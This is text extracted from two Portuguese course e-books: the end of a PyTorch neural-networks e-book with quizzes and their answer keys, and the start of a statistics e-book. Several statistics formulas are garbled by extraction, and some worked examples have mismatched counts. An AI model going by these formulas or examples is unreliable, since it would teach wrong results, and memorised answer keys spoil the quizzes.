(MSE). Esta função calcula a diferença entre a saída prevista pelo modelo 
e o valor esperado (target) ao quadrar o erro. O objetivo do treinamento é 
minimizar essa perda. 
Otimizador 
 optim.SGD: Cria o otimizador SGD (Gradiente Descendente Estocástico). 
Ele ajusta os pesos da rede com base nos gradientes calculados durante 
a retropropagação. O argumento model.parameters() indica que o 
otimizador deve atuar nos parâmetros do modelo (os pesos das camadas 
da rede neural). 
 lr=0.01: A taxa de aprendizado é configurada para 0.01. Isso controla o 
tamanho dos passos que o otimizador dá ao ajustar os pesos. 
Loop de Treinamento 
 for epoch in range(100): O treinamento será realizado por 100 épocas, ou 
seja, o modelo passará 100 vezes por todo o conjunto de dados. 
 model.train(): Coloca o modelo em modo de treinamento, o que é 
importante para certas operações que ocorrem de maneira diferente em 
comparação ao modo de inferência (como o dropout). 
 optimizer.zero_grad(): Antes de cada iteração de treinamento, os 
gradientes acumulados dos parâmetros são zerados. Isso é necessário 
porque, no PyTorch, os gradientes são acumulados a cada chamada de 
backward(). 
Propagação Direta e Cálculo da Perda 
 output = model(input_data): Passa os dados de entrada pelo modelo, 
realizando a propagação direta (forward pass), para gerar a saída 
prevista. 

 
 
 loss = loss_fn(output, target): Calcula a perda (erro) entre a saída prevista 
pelo modelo (output) e os valores-alvo (target). A função de perda 
escolhida é o MSE. 
Retropropagação e Atualização dos Pesos 
 loss.backward(): Realiza a retropropagação. Isso calcula os gradientes da 
perda em relação a cada um dos pesos do modelo. Esses gradientes são 
usados para ajustar os pesos e minimizar a perda. 
 optimizer.step(): Usa os gradientes calculados para atualizar os pesos da 
rede, conforme definido pelo algoritmo SGD. Cada passo move os pesos 
na direção que minimiza a função de perda. 
Aprenda Mais:   
Redes Neurais com PyTorch.  
Disponível em: https://colab.research.google.com/github/storopoli/ciencia-de-
dados/blob/main/notebooks/Aula_18_b_Redes_Neurais_com_PyTorch.ipynb 
 
 
Questão 1. Qual é o principal objetivo da retropropagação em redes neurais? 
A) Melhorar a velocidade do treinamento 
B) Minimizar a função de perda ajustando os pesos 
C) Aumentar o número de camadas na rede 
D) Reduzir o número de neurônios na camada de saída 
 
Questão 2. Durante o processo de retropropagação, em qual etapa ocorre a 
atualização dos pesos? 
A) Na propagação direta 
B) No cálculo da perda 
C) Na retropropagação do erro 
D) Após o cálculo do gradiente da função de perda 
 
Questão 3. Qual das seguintes variantes do gradiente descendente pode ser 
mais eficiente para grandes conjuntos de dados? 
A) Gradiente descendente em lote completo 
B) Gradiente descendente estocástico (SGD) 
C) Gradiente com momento 
D) Gradiente descendente com taxa de aprendizado fixa 
 
Testando seu conhecimento 
 

 
 
 
Questão 4. Qual das opções abaixo descreve corretamente o papel do momento 
no gradiente descendente? 
A) Introduz aleatoriedade nas atualizações dos pesos 
B) Controla a taxa de aprendizado automaticamente 
C) Ajuda a evitar mínimos locais e acelera a convergência 
D) Calcula o erro da função de perda em tempo real 
 
Questão 5. Uma taxa de aprendizado muito alta pode causar: 
A) Convergência rápida e estável 
B) Grandes saltos nos pesos, tornando o treinamento instável 
C) A rede a "memorizar" os dados de treinamento 
D) Um erro maior na função de perda a cada iteração 
 
 
Questão 6. O que diferencia o gradiente descendente com mini-batches do 
gradiente descendente estocástico (SGD)? 
A) Mini-batches atualiza os pesos após cada exemplo de treinamento 
B) Mini-batches combina a eficiência do SGD com a estabilidade do gradiente 
descendente em lote completo 
C) Mini-batches utiliza toda a base de dados para calcular o gradiente 
D) Mini-batches ajusta automaticamente a taxa de aprendizado 
 
Questão 7. O que pode ocorrer se a taxa de aprendizado for muito baixa durante 
o treinamento? 
A) A rede convergirá rapidamente, mas com erro alto 
B) O treinamento pode ser muito lento, com ajustes pequenos nos pesos 
C) O modelo será incapaz de generalizar para novos dados 
D) A função de perda não será calculada corretamente 
 
Questão 8. Algoritmos como RMSprop e Adam são exemplos de: 
A) Taxas de aprendizado fixas 
B) Algoritmos que utilizam momento 
C) Taxas de aprendizado adaptativas 
D) Algoritmos de regularização 
 
Questão 9. Qual é a função da propagação direta em redes neurais? 
A) Calcular o gradiente da função de perda 
B) Passar a entrada pela rede e produzir uma previsão 
C) Ajustar os pesos após cada iteração 
D) Minimizar a função de perda durante o treinamento 
 
Questão 10. A função de perda em uma rede neural tem o papel de: 
A) Ajustar os pesos automaticamente 
B) Calcular o erro entre a previsão e o valor real 
C) Controlar a taxa de aprendizado 
D) Estabilizar as atualizações dos pesos 
 

 
 
Questão 11. Qual das seguintes estratégias pode ajudar a evitar problemas com 
taxas de aprendizado mal calibradas? 
A) Aumentar o número de camadas na rede 
B) Usar decaimento da taxa de aprendizado 
C) Remover neurônios das camadas ocultas 
D) Aumentar o número de iterações no treinamento 
 
Questão 12. Qual é o objetivo final do treinamento de uma rede neural? 
A) Memorizar os dados de treinamento 
B) Minimizar o erro apenas nos dados de teste 
C) Generalizar bem para novos dados nunca antes vistos 
D) Reduzir o número de neurônios para aumentar a eficiência 
 
Questão 13. O termo "overfitting" em redes neurais refere-se a: 
A) A capacidade de uma rede aprender rapidamente 
B) O ajuste excessivo do modelo aos dados de treinamento, prejudicando a 
generalização 
C) O uso excessivo de gradiente descendente 
D) A minimização eficiente da função de perda 
 
Questão 14. O que ocorre durante a retropropagação do erro em uma rede 
neural? 
A) O gradiente da função de perda é calculado em relação aos pesos 
B) A entrada é passada pela rede para gerar uma previsão 
C) O número de iterações é aumentado 
D) A função de ativação é ajustada para cada neurônio 
 
Questão 15. O que diferencia o gradiente descendente com mini-batches do 
gradiente descendente em lote completo? 
A) Lote completo usa apenas um exemplo de treinamento por vez 
B) Mini-batches divide os dados em pequenos lotes, enquanto o lote completo 
usa todos os dados 
C) Mini-batches ajusta a taxa de aprendizado automaticamente 
D) Lote completo introduz variação nas atualizações 
 
 
Respostas 
Questão 1: Resposta correta: B 
Questão 2: Resposta correta: D 
Questão 3: Resposta correta: B 
Questão 4: Resposta correta: C 
Questão 5: Resposta correta: B 
Questão 6: Resposta correta: B 
Questão 7: Resposta correta: B 
Questão 8: Resposta correta: C 
Questão 9: Resposta correta: B 
Questão 10: Resposta correta: B 
Questão 11: Resposta correta: B 
Questão 12: Resposta correta: C 

 
 
Questão 13: Resposta correta: B 
Questão 14: Resposta correta: A 
Questão 15: Resposta correta: B 
 
 
 

 
 
UNIDADE 4 MÉTRICAS DE AVALIAÇÃO DE REDES NEURAIS 
Nesta unidade são apresentadas as principais métricas de avaliação de modelos 
de redes neurais para o problema de classificação. 
 
OBJETIVOS DA UNIDADE 4  
Ao final dos estudos, você deverá ser capaz de: 
 Entender a utilização da principais métricas de classificação para validar 
um modelo treinado 
 
 
 

 
 
A avaliação de redes neurais é que não pode ser deixada de lado pois é utilizada 
para verificar se o modelo treinado está desempenhando bem sua tarefa e 
generalizando adequadamente para novos dados. Nesta unidade, discutiremos 
as principais métricas utilizadas para avaliar redes neurais em problemas de 
classificação. 
 
4.1 IMPORTÂNCIA DAS MÉTRICAS DE AVALIAÇÃO 
As métricas de avaliação são utilizadas para medir a eficácia de um modelo. Elas 
fornecem uma forma objetiva de comparar o desempenho entre diferentes 
modelos e ajustar hiperparâmetros, como a taxa de aprendizado e o número de 
camadas ocultas.  
 
Ao longo do treinamento, as métricas de desempenho ajudam a monitorar o 
progresso da rede, identificar overfitting e underfitting, e tomar decisões sobre a 
necessidade de ajustes no modelo. 
As métricas mais comuns dependem do tipo de problema que o modelo está 
resolvendo, sendo que cada tarefa exige uma métrica específica ou um conjunto 
delas para avaliação adequada. 
 
4.2 AVALIAÇÃO DE MODELOS DE CLASSIFICAÇÃO BINÁRIA 
Nos problemas de classificação binária, o objetivo é atribuir um rótulo de uma 
entre duas classes, como "positivo" ou "negativo". As principais métricas de 
avaliação incluem: 
 
4.2.1 ACURÁCIA 
A Acurácia mede a proporção de previsões corretas em relação ao número total 
de amostras. Embora seja uma métrica amplamente utilizada, ela pode ser 
enganosa quando há desbalanceamento entre as classes. 
 
4.2.2 MATRIZ DE CONFUSÃO 
A Matriz de Confusão é uma tabela que resume as previsões feitas pelo modelo 
em comparação com os valores reais. Ela é composta por quatro valores: 
 
Verdadeiros Positivos (VP): A quantidade de previsões corretas da classe 
positiva. 

 
 
 
Falsos Positivos (FP): A quantidade de previsões incorretas da classe 
positiva. 
 
Verdadeiros Negativos (VN): A quantidade de previsões corretas da 
classe negativa. 
 
Falsos Negativos (FN): A quantidade de previsões incorretas da classe 
negativa. 
Essa matriz permite o cálculo de métricas importantes como precisão e 
revocação. 
 
4.2.3 PRECISÃO E REVOCAÇÃO 
A Precisão mede a proporção de previsões positivas que são realmente 
positivas, ou seja, a capacidade do modelo de evitar falsos positivos. 
 
A Revocação mede a proporção de verdadeiros positivos capturados pelo 
modelo, ou seja, sua capacidade de encontrar todas as instâncias da classe 
positiva. 
 
4.2.4 F1-SCORE 
O F1-Score é a média harmônica entre a precisão e a revocação. Ele oferece 
uma métrica equilibrada que é útil quando há desbalanceamento entre as 
classes. 
 
 
 
 
 
Testando seu conhecimento 
 

 
 
Questão 1. A retropropagação é uma técnica amplamente utilizada no 
treinamento de redes neurais artificiais. Qual é o principal objetivo deste 
algoritmo? 
A) Maximizar o número de camadas ocultas na rede. 
B) Minimizar a função de perda ajustando os pesos da rede. 
C) Aumentar a taxa de aprendizado ao longo do treinamento. 
D) Garantir que a rede generalize melhor ajustando os dados de entrada. 
 
Questão 2. Durante o processo de retropropagação, qual etapa é responsável 
por ajustar os pesos da rede? 
A) Cálculo da função de ativação. 
B) Propagação direta. 
C) Cálculo do erro. 
D) Atualização dos pesos usando o gradiente descendente. 
 
Questão 3. A retropropagação utiliza o método do gradiente descendente para 
ajustar os pesos da rede. Qual problema essa técnica visa resolver? 
A) Reduzir o número de iterações no processo de treinamento. 
B) Minimizar o erro acumulado ao longo de todas as amostras. 
C) Aumentar o número de neurônios na camada de saída. 
D) Garantir que os dados sejam pré-processados corretamente. 
 
Questão 4. Qual das opções a seguir é uma métrica adequada para avaliar o 
desempenho de um modelo de classificação binária, em um cenário com classes 
desbalanceadas? 
A) Acurácia. 
B) Precisão. 
C) Taxa de aprendizado. 
D) Número de épocas. 
 
Questão 5. A matriz de confusão é uma ferramenta importante para avaliar o 
desempenho de modelos de classificação binária. Qual dos elementos abaixo 
mede a quantidade de previsões incorretas da classe positiva? 
A) Verdadeiros Positivos (VP). 
B) Verdadeiros Negativos (VN). 
C) Falsos Positivos (FP). 
D) Falsos Negativos (FN). 
 
Questão 6. Qual métrica é mais apropriada para medir a capacidade de um 
modelo em evitar falsos positivos em um problema de classificação binária? 
A) Acurácia. 
B) Precisão. 
C) Revocação. 

 
 
D) F1-Score. 
 
Questão 7. Se um modelo de classificação binária apresenta alta revocação, o 
que isso indica sobre seu desempenho? 
A) O modelo faz muitas previsões corretas da classe negativa. 
B) O modelo identifica corretamente a maior parte dos exemplos positivos. 
C) O modelo está evitando a maior parte dos falsos negativos. 
D) O modelo tem alta acurácia. 
 
Questão 8. O F1-Score é uma métrica que combina precisão e revocação. Por 
que ele é especialmente útil em problemas de classificação binária com classes 
desbalanceadas? 
A) Porque leva em consideração apenas os verdadeiros positivos. 
B) Porque ignora os falsos negativos. 
C) Porque oferece um equilíbrio entre precisão e revocação. 
D) Porque é equivalente à acurácia em problemas desbalanceados. 
 
Questão 9. Em uma rede neural treinada com retropropagação, o que pode 
indicar que o modelo está sofrendo de "overfitting"? 
A) Alta acurácia nos dados de treinamento e baixa acurácia nos dados de teste. 
B) Baixa acurácia nos dados de treinamento e alta acurácia nos dados de teste. 
C) Alto F1-Score em ambos os conjuntos de dados. 
D) Alta revocação e baixa precisão nos dados de teste. 
 
Questão 10. Qual das alternativas a seguir descreve corretamente o processo 
de retropropagação em uma rede neural? 
A) Ajuste dos pesos baseado no erro calculado na camada de entrada. 
B) Atualização dos pesos usando gradiente descendente a partir da camada de 
saída até a camada de entrada. 
C) Ajuste dos pesos com base nas saídas corretas geradas pela rede. 
D) Atualização das funções de ativação em cada neurônio. 
 
Questão 11. Suponha que um modelo de rede neural está superestimando 
sistematicamente a classe positiva em um problema de classificação binária. 
Qual métrica seria mais adequada para entender esse comportamento? 
A) Acurácia. 
B) Precisão. 
C) Revocação. 
D) F1-Score. 
 
Questão 12. No treinamento de redes neurais, a divisão da base de dados em 
conjuntos de treino e teste é fundamental para: 
A) Aumentar o número de amostras disponíveis para o modelo aprender. 

 
 
B) Avaliar a capacidade de generalização do modelo em dados novos. 
C) Garantir que o modelo memorize todas as amostras de treinamento. 
D) Reduzir a complexidade computacional durante o treinamento. 
 
Questão 13. Em um problema de classificação binária, quando o modelo é muito 
conservador e raramente classifica uma amostra como positiva, é provável que 
a precisão seja: 
A) Baixa, e a revocação alta. 
B) Alta, mas a revocação baixa. 
C) Alta, e a revocação também alta. 
D) Baixa, e o F1-Score alto. 
 
Questão 14. Durante o ajuste dos hiperparâmetros de uma rede neural, qual 
métrica deve ser monitorada para evitar "overfitting"? 
A) Acurácia nos dados de treinamento. 
B) Acurácia nos dados de validação. 
C) Precisão nos dados de treinamento. 
D) Taxa de aprendizado durante o treino. 
 
Questão 15. No contexto de classificação binária, o que significa uma alta taxa 
de falsos negativos? 
A) O modelo está errando frequentemente ao prever a classe negativa como 
positiva. 
B) O modelo está errando frequentemente ao prever a classe positiva como 
negativa. 
C) O modelo está classificando corretamente a classe positiva. 
D) O modelo tem baixa acurácia nos dados de treinamento. 
 
Respostas: 
 
Questão 1. B)  
Questão 2. D)  
Questão 3. B)  
Questão 4. B)  
Questão 5. C)  
Questão 6. B)  
Questão 7. B)  
Questão 8. C) 
Questão 9. A)  
Questão 10. B)  
Questão 11. B)  
Questão 12. B)  
Questão 13. B)  

 
 
Questão 14. B)  
Questão 15. B)  
 
 
Exemplo de código completo 
 
 
 

 
 
UNIDADE 5 PROJETO DE TREINAMENTO DE UMA REDE 
NEURAL 
Esta unidade apresenta um projeto completo de criação de uma rede neural 
MLP, treinamento e teste. 
 
OBJETIVOS DA UNIDADE 5  
Ao final dos estudos, você deverá ser capaz de: 
 Entender o processo completo de treinamento de uma rede através de um 
estudo de caso 
 
 

 
 
Nesta unidade você encontra o código que implementa uma rede neural simples 
usando PyTorch para resolver um problema de classificação binária. Ele também 
utiliza as funções de métrica do Scikit-learn para avaliar o desempenho do 
modelo.  
O código está dividido em partes mas pode ser digitado na sequencia para ser 
executado. 
 
5.1 IMPORTANDO OS PACOTES 
 
 
 torch: Biblioteca PyTorch, usada para criar tensores, redes neurais e 
funções de otimização. 
 torch.nn: Módulo que contém os blocos básicos para definir redes 
neurais, como camadas totalmente conectadas. 
 torch.optim: Módulo de otimizadores, usado para atualizar os pesos da 
rede durante o treinamento. 
 sklearn.metrics: Contém as funções de métrica usadas para avaliar o 
desempenho do modelo, como acurácia, precisão, revocação e F1-Score. 
 
 
5.2 DEFININDO A ESTRUTURA DA REDE 
 
 
 SimpleNN: Define uma rede MLP (MultiLayer Perceptron) simples com 
uma camada oculta e uma camada de saída. 
 nn.Linear(10, 50): Primeira camada totalmente conectada (fully 
connected) com 10 neurônios de entrada e 50 de saída. 

 
 
 nn.ReLU(): Função de ativação ReLU é aplicada após a primeira camada 
para introduzir não-linearidade. 
 nn.Linear(50, 2): A segunda camada tem 50 neurônios de entrada e 2 
saídas (binárias, para classificação entre duas classes). 
 
5.3 INSTANCIANDO A REDE 
 
5.4 GERAÇÃO DOS DADOS SINTÉTICOS 
 
 torch.randn(100, 10): Gera um conjunto de dados de treino com 100 
exemplos, cada um com 10 características aleatórias (normalmente 
distribuídas). 
 torch.randint(0, 2, (100,)): Gera rótulos de classe binária (0 ou 1) para os 
exemplos de treino. 
 X_test e y_test: Dados de teste com 20 exemplos e rótulos de classes 
binárias. 
 
5.5 DEFININDO A FUNÇÃO DE PERDA E O OTIMIZADOR 
 
 
 nn.CrossEntropyLoss(): Função de perda para problemas de 
classificação.  
 optim.SGD(): Otimizador Stochastic Gradient Descent (Gradiente 
Descendente Estocástico) com taxa de aprendizado de 0.01. 
 
5.6 DEFININDO A QUANTIDADE DE ÉPOCA 
 
 

 
 
 model.train(): Coloca o modelo no modo de treinamento, o que é 
importante se houver dropout ou camadas específicas que se comportam 
de maneira diferente entre treinamento e inferência. 
 
5.7 EXECUTANDO O FORWARD 
 
 Forward pass: Os dados de treinamento são passados pela rede, 
produzindo saídas (outputs), que são comparadas com os rótulos 
verdadeiros (y_train) para calcular a perda usando criterion. 
 
5.8 EXECUTANDO O BACKPROPAGATION 
 
 Backward pass: O erro (perda) é retropropagado através do modelo, 
calculando os gradientes em relação aos pesos. O otimizador então ajusta 
os pesos para minimizar a perda. 
 
5.9 MOSTRANDO A PERDA NA TELA 
 
 Print da perda a cada 10 épocas: Monitora o valor da perda durante o 
treinamento. 
 

 
 
5.10 EXECUTANDO O MODELO COM OS DADOS DE TESTE 
 
 model.eval(): Coloca o modelo em modo de avaliação, o que desativa 
camadas como dropout ou batch normalization. 
 torch.no_grad(): Desativa o cálculo de gradientes durante a fase de 
inferência para economizar memória e acelerar o processo. 
 torch.max(outputs.data, 1): Retorna o índice da classe com a maior 
probabilidade para cada exemplo de entrada. 
 
5.11 TRANSFORMANDO OS TENSORES PARA ARRAY NUMPY 
 
 Conversão para NumPy: Converte os tensores PyTorch para arrays 
NumPy para usar as funções de métrica do Scikit-learn. 
 
5.12 CALCULANDO AS MÉTRICAS DE CLASSIFICAÇÃO 
 
 Conversão para NumPy: Converte os tensores PyTorch para arrays 
NumPy para usar as funções de métrica do Scikit-learn. 
 Acurácia (accuracy_score): Mede a proporção de previsões corretas. 

 
 
 Precisão (precision_score): Mede a proporção de verdadeiros positivos 
sobre todas as previsões positivas. 
 Revocação (recall_score): Mede a proporção de verdadeiros positivos 
sobre todos os exemplos positivos reais. 
 F1-Score: Média harmônica da precisão e revocação, útil para balancear 
as duas métricas. 
 
 
 
 
 
 
 
 

 
 
FINALIZAR 
 
Finalizamos o presente material sobre Redes Neurais, cobrindo conceitos 
essenciais e técnicas fundamentais para o entendimento e aplicação deste 
campo em crescente desenvolvimento. Iniciamos com uma introdução aos 
conceitos básicos de redes neurais, passando pela arquitetura de neurônios 
artificiais e suas variações, como Redes Neurais Feedforward, Convolucionais, 
Recorrentes, LSTM, Autoencoders e Transformers. 
Avançamos para a compreensão das Redes Multilayer Perceptron, explorando 
a importância das camadas em redes neurais e o funcionamento do Perceptron 
multicamadas, 
consolidando 
as 
bases 
para 
redes 
mais 
complexas. 
Posteriormente, exemplificamos o uso do PyTorch, abordando sua estrutura 
básica, o processo de propagação direta, inicialização de pesos, funções de 
ativação, dropout e cálculo da função de perda. 
Na sequência, discutimos a retropropagação, destacando o uso do gradiente 
descendente como técnica de otimização. Finalizamos com as métricas de 
avaliação de redes neurais, essenciais para a análise de desempenho de 
modelos, incluindo acurácia, matriz de confusão, precisão, revocação e F1-
score, com foco na avaliação de modelos de classificação binária. Além disso, 
apresentamos um projeto completo de treinamento de uma rede neural artificial 
Este material oferece um panorama técnico e fundamentado, que pode servir 
como base para a aplicação prática de redes neurais em diferentes contextos. 
Encorajo a continuidade nos estudos e a prática constante para aprimorar a 
compreensão e o domínio dessas técnicas. O campo das redes neurais está em 
constante evolução, e o aprofundamento contínuo é essencial para acompanhar 
as novas tendências e inovações tecnológicas. 
Profa. Dra. Joelma de Moura Ferreira 
 
 

 
 
Sobre a autora 
 
Joelma de Moura Ferreira é doutora em Ciência da Computação pela 
Universidade Federal de Goiás, com mestrado em Ciência da Computação pela 
Universidade Federal de Goiás, MBA em Gerenciamento de Projetos pela 
Fundação Getúlio Vargas, especialização em Redes de Computadores pela 
Universidade Salgado de Oliveira, MBA em Tecnologia para Negócios: AI, Data 
Science e Big Data pela Pontifícia Universidade Católica do Rio Grande do Sul 
e graduação em Ciência da Computação pela Universidade Católica de Goiás. 
Tendo atuado por mais de 20 anos como docente de graduação e pós-graduação 
em diversas instituições de ensino superior, incluindo Faculdade Sul-Americana, 
Universidade Paulista, Faculdade Estácio de Sá de Goiás, Pontifícia 
Universidade Católica, Centro Universitário Alves Farias. Desempenhou a 
função de coordenadora do curso de graduação de Sistemas de Informação e 
dos cursos de pós-graduação em Gestão de Projetos, Gestão de Tecnologia da 
Informação e Arquitetura e Engenharia de Software no Centro Universitário Alves 
Faria, onde também exerceu a atividade de pesquisadora no Mestrado em 
Desenvolvimento R Fora do domínio acadêmico, exerce a função de Cientista 
de Dados no Tribunal de Justiça do Distrito Federal e Territórios. 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
SILVA. et. al. Inteligência artificial SAGAH, 2019. 
SICSÚ, A. L. et. al. Técnicas de Machine Learning, Blucher, 2023. 
HAYKIN, Simon. Redes Neurais: Princípios e Prática. Bookman, 2007 
FACELI, K. et. al Inteligência Artificial: uma abordagem de aprendizado de 
máquina, LTC, 2021 
RUSSEL, Stuart J.,  NORVIG, P. Inteligência Artificial - Uma Abordagem 
Moderna, LTC, 2022. 
GÉRON, Aurélien . Mãos à Obra Aprendizado de Máquina com Scikit-Learn 
GRUS, Joel. Data Science do Zero, Alta Books, 2019. 
KAUFMAN, D., Desmistificando a inteligência artificial, Autentica, 2022.  


--- Fim do arquivo: eBook - Redes Neurais.pdf ---

--- Começo do arquivo: eBook - Estatística 2.pdf ---

 
 
UNIDADE 1: Revisão de Conceitos Básicos de Estatística 
 
Nessa Unidade veremos conceitos estatísticos básicos, já vistos antes em Estatística 1, 
porém utilizaremos com muita ênfase nas próximas unidades, por isso serão revistos. 
Veremos também alguns conceitos mais amplos sobre gráficos e medidas de tendência 
centrais. 
 
1.1- Introdução à estatística. 
 
Temos registros Estatísticos desde a antiguidade: registros de números de habitantes, 
nascimentos, óbitos, impostos, contagem em geral (principalmente para finalidades 
tributárias ou bélicas). Posteriormente (a partir do séc. XVI), surge a necessidade de 
chegar à conclusão sobre “o todo” partindo da observação “de partes” dele, princípio da 
Estatística. 
Inicialmente muito conhecimento foi adquirido por acaso, porém, com a diversidade de 
pessoas em estudos e técnicas, surge a necessidade do estabelecimento de meios 
organizados para se chegar a algum resultado de interesse. Principais métodos: 
experimental, numérico e estatístico. 
O método experimental fixa todos os fatores de entrada numa análise, exceto um, o qual 
é variado de forma a possibilitar a descoberta de seus efeitos. 
O método numérico busca modelar numericamente os fatores mais importantes de um 
processo e tenta simular o comportamento ou resultado deste processo. 
O método estatístico surge quando no estudo de alguns aspectos onde não é possível 
a fixação de fatores (p.ex. os sociais), ao contrário, é necessário a consideração de 
variações simultâneas destes, na tentativa da descoberta (e/ou previsão) de seus 
efeitos. Busca-se determinar o grau de influência de cada fator na resposta final. 
 
1.2 – Estatística 
 
É a parte da matemática aplicada que fornece métodos para coleta, descrição, análise 
e interpretação de dados, auxiliando na tomada de decisões. 

 
 
Divide-se em Estatística Descritiva (coleta, organização e descrição de dados) e 
Estatística Indutiva ou Inferencial (análise e interpretação). Aqui trataremos da 
estatística descritiva. 
 
1.2.1 – Fase 01: Coleta de dados. 
A coleta dos dados é realizada após um cuidadoso planejamento e determinação das 
características mensuráveis do fenômeno coletivamente típico que se quer pesquisar. 
A coleta pode ser direta (é feita sobre os elementos informativos – P.Ex.: quantidade de 
nascimentos, óbitos, renda mensal, etc) e indireta (é feita sobre elementos relacionados 
ou é inferida dos elementos conhecidos – P.Ex.: mortalidade infantil / dados colhidos de 
uma coleta direta). 
Coleta direta: contínua (feita continuamente sem interrupções, p.ex.: nascimentos e 
óbitos), periódica (feita em intervalos regulares de tempo, p.ex.: censo a cada década), 
ocasional (geralmente de caráter investigativo ou emergencial – p.ex.: Epidemias). 
 
1.2.2 – Fase 02: Crítica dos dados. 
Procura de possíveis falhas e/ou imperfeições que podem ocorrer por parte do 
informante (crítica externa) por pressa, distração, mau-entendimento ou quando analisa 
os elementos amostrados (interna) em busca de falhas tipográficas, irregularidades, etc. 
 
1.2.3 – Fase 03: Apuração: soma e processamento de dados obtidos (manual, 
eletromecânica ou eletrônica); 
 
1.2.4 – Fase 04: Exposição ou apresentação de dados. Os meios mais utilizados são as  
tabelas e gráficos. 
 
1.2.5 – Fase 05: Análise de resultados 
Visa tirar conclusões e fazer previsões sobre o todo (população) a partir de uma parte 
(amostra) que seja representativa. 
 
1.3  Aplicações  

 
 
1. 
Ciências Naturais e Meio Ambiente: Análise de dados climáticos para estudar 
mudanças climáticas; modelagem estatística para entender padrões de biodiversidade; 
análise de poluentes em água e ar. 
2. 
Educação: Avaliação de métodos de ensino através de testes estatísticos; 
estudos para identificar fatores que influenciam o desempenho acadêmico; análise de 
resultados de exames para ajustes curriculares. 
3. 
Tecnologia e Internet: Análise de dados de usuários para personalização de 
recomendações em plataformas online; otimização de redes de computadores com base 
em dados de tráfego; análise de desempenho de algoritmos de machine learning. 
4. 
Economia e Finanças: Análise de séries temporais para prever tendências 
econômicas, como taxas de inflação e desemprego; avaliação de risco em 
investimentos; análise de mercado para determinar demanda e oferta de produtos. 
5. 
Medicina e Ciências da Saúde: Ensaios clínicos para testar a eficácia de novos 
medicamentos; estudos epidemiológicos para entender a propagação de doenças; 
análise de dados para identificar fatores de risco em saúde pública. 
6. 
Marketing e Pesquisa de Mercado: Análise de dados de consumidores para 
segmentação de mercado; testes A/B para otimizar campanhas de marketing digital; 
previsão de vendas com base em padrões históricos. 
Essas são algumas das aplicações da Estatística, ela está presente em vários contexto 
de nosso cotidiano. 
 
1.4  Variáveis Estatísticas 
 
Ao realizar uma pesquisa ou experimento chamamos o conjunto de resultados possíveis 
de variáveis estatísticas. 
.Ex.: 
Sexo ® masculino / feminino; 
Número de Filhos ® 0, 1, 2, 3.....; 
Estatura ® 1,5m,  1,68m, 1,824m ......; 
 
As variáveis podem ser classificadas como: qualitativas e quantitativas. 
 

 
 
1.4.1 Variáveis Qualitativas expressam atributos dos dados, como: sexo (M/F), pele 
(branca, preta, amarela etc), estado de origem (GO, TO, MA etc), grau de instrução 
(primário, 2o grau, 3o grau). Podem se subdividir em nominais ou ordinais. 
As Variáveis qualitativas nominais não possuem ordenação, por exemplo, 
nacionalidade, tipo de sangue, cor dos olhos, etc. Já as variáveis qualitativas ordinais 
têm ordenação nas realizações, por exemplo: grau de instrução (fundamental, médio ou 
superior), patente militar, etc. 
 
1.4.2 Variáveis Quantitativas são expressas por números: salários, idades, alturas, 
pesos etc. Podem se subdividir em discretas, obtidas em contagens e numerações, ou 
contínuas, obtidas por medições com intervalo de valores. 
  
Ex: Uma pesquisa realizada sobre a quantidade de filhos, a variável é quantitativa 
discreta. Já em uma pesquisa sobre faixa de valores salariais a variável é quantitativa 
contínua. 
 
 
1.5 População e amostra 
 
População: conjunto de entes portadores de uma característica de interesse (população 
estatística ou universo estatístico). 
Amostra: subconjunto finito e representativo da população. 
Nem sempre é possível estudar toda a população (censo) para se identificar 
precisamente uma característica de interesse (variável). Existem várias limitações: 
desconhecimento da dimensão da população, população enorme (infinita) e esparsa, 
tempo escasso, processo de inspeção inadequado (pode ser destrutivo) etc. Assim, é 
necessário estimar tais variáveis através de estudos de parte dessa população, ou 
melhor, analisando-se amostras.  
Os principais processos de amostragem são: Amostragem Aleatória Simples; 
Amostragem Sistemática, Amostragem Estratificada e Amostragem por Conglomerados 
ou Agrupamentos.  
 

 
 
1.6- Resumo de Dados 
 
Resumos visuais e numéricos são importantes nas análises estatísticas, dentre os quais 
destacam-se: tabelas, gráficos e mapas; 
Os dados estatísticos são obtidos através da observação ou outra mensuração de itens. 
Tais itens são chamados de variáveis, porque originam valores que tendem a exibir certo 
grau de variabilidade quando se fazem mensurações sucessivas. 
Assim que coletamos os dados eles são expressos como Dados Brutos. Após passarem 
por técnicas adequadas a cada tipo eles são apresentados de forma resumida, com a 
finalidade de facilitar a análise e compreensão. 
 
 
Ex: O conjunto abaixo representa escores de QI de crianças que viviam próximos a uma 
fundição de chumbo. Os dados são  Brutos e como estão sua análise é mais 
complicada, por isso é necessário apresentar de forma reduzida.  
 
 
 
FONTE: Triola, F. Mario 
 
 

 
 
 
 
 
Apresentamos esses dados de forma resumida na tabela abaixo e podemos verificar 
que a interpretação dos resultados fica mais fácil. 
 
 
 
Dessa forma a análise é bem mais facilitada.  
 
 
Ex: Considere os seguintes dados brutos sobre a idade de 18 pessoas: 25, 32, 40, 18, 
55, 22, 30, 37, 19, 41, 28, 50, 65, 23, 35, 42, 20, 48, 27, 33. Apresentados em tabela de 
forma reduzida temos: 
 
 
Podemos representar também em como gráfico para o caso de demonstrar visualmente 

 
 
 
 
 
 
1.6 – Medidas de Tendência Central 
 
1.6.1 MÉDIA: 
A média de uma variável é dada por 𝑥̅ = ∑!!
"
#
 , onde 𝑥# são os valores obtidos e 𝑛 é o 
total de valores. Quando os dados estão resumidos e temos uma distribuição de 
frequência a média é dada por   
𝑥̅ = ∑$!.!!
"
#
, sendo 𝑓# a frequência de 𝑥#. Caso os dados estejam agrupados em intervalos 
consideramos 𝑥# o ponto médio do mesmo 
 
Ex: Os seguintes dados abaixo representam as idades de dez alunos 
19, 22, 23, 22, 19, 20, 25, 32, 41, 22. Então a média de idade é: 
𝑥̅ = 2.  19 + 3.22 + 23 + 20 + 25 + 32 + 41
10
= 24,5 
 
Ex: A tabela abaixo representa uma pesquisa com 50 pessoas, sobre o valor das 
compras realizadas em uma padaria: 
 
idade
[18, 35]
(35, 52]
(52, 69]
quantidade de pessoas
0
2
4
6
8
10
12
14
Faixa Etária

 
 
 
 
A média de compras é dada por: 
 
𝑥̅ = 8.  9,6 + 20.46,9 + 6.35,35 + 8.49,3 + 3. 61,1 + 1. 74 + 4.86.9
40
= 44,5 
Nesse caso o valor médio de cada intervalo representa 𝑥# 
 
1.6.2  - VARIÂNCIA ( “ s2 ”   ou   “ s2 ” )   
 
A variância é uma medida baseada nos desvios em torno da média e de grande utilidade 
